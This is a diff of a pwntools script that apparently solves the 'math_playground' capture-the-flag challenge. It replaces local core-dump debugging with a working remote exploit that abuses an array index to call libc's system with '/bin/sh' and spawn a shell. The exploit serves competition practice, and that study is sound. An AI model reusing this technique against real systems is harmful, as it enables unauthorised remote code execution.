@@ -1,23 +1,18 @@
 from pwn import *
 
-r = process('./math_playground')
+r = remote('chal.bearcatctf.io', 46060)
 
-r.sendline(b'711626368')
-r.sendline(b'-135057195 -136584848')
-#r.interactive()
+libc_base = 0xf7d89000  # Base of libc in program
+system = 0xf7dd0cd0     # Location of system function
+system_signed = system-0x100000000 # convert to signed int
+sh = 0x1b90d5           # Offset of /bin/sh string in libc
+sh_abs = sh + libc_base # Absolute location of string in memory
+sh_signed = sh_abs-0x100000000     # convert to signed int
 
-# Wait for the process to crash and create a core dump
-r.wait()
+stack_system = 0xffffde00 # Location of system pointer int in stack
+ops = 0x56558fc4          # Address of operations array
+func_offset = (stack_system-ops-0x44)//4 # Calculate relative location of stack reference to system from ops head
 
-# Load the core file
-core = r.corefile
-
-# Print out information from the core file for debugging
-print("Fault Address: 0x{:x}".format(core.fault_addr))
-print("Instruction pointer: 0x{:x}".format(core.pc))
-print("Stack pointer: 0x{:x}".format(core.sp))
-print("Register details:")
-for reg in core.arch.registers:
-    print("  {} = 0x{:x}".format(reg, core.registers[reg]))
-
-# Additional actions can be performed based on the core file content
+r.sendline(f'{func_offset}'.encode())
+r.sendline(f'{sh_signed} {system_signed}'.encode())
+r.interactive() # Spawns shell on remote system
